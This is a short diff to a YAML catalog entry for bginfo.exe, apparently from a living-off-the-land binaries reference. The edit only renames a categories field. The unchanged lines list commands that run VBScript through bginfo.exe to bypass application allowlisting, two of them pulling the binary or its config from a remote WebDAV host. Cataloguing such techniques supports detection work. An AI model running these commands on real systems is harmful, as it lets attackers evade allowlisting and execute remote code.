@@ -7,7 +7,7 @@ Commands:
   - Command: bginfo.exe bginfo.bgi /popup /nolicprompt
     Description: Execute VBscript code that is referenced within the bginfo.bgi file.
     Usecase: Local execution of VBScript
-    Categories: ['Execution', 'AWL Bypass']
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
@@ -15,7 +15,7 @@ Commands:
   - Command: '"\\10.10.10.10\webdav\bginfo.exe" bginfo.bgi /popup /nolicprompt'
     Usecase: Remote execution of VBScript
     Description: Execute bginfo.exe from a WebDAV server.
-    Categories: ['Execution', 'AWL Bypass']
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
@@ -23,7 +23,7 @@ Commands:
   - Command: '"\\live.sysinternals.com\Tools\bginfo.exe" \\10.10.10.10\webdav\bginfo.bgi /popup /nolicprompt'
     Usecase: Remote execution of VBScript
     Description: This style of execution may not longer work due to patch.
-    Categories: ['Execution', 'AWL Bypass']
+    Category: AWL Bypass
     Privileges: User
     MitreID: T1218
     MitreLink: https://attack.mitre.org/wiki/Technique/T1218
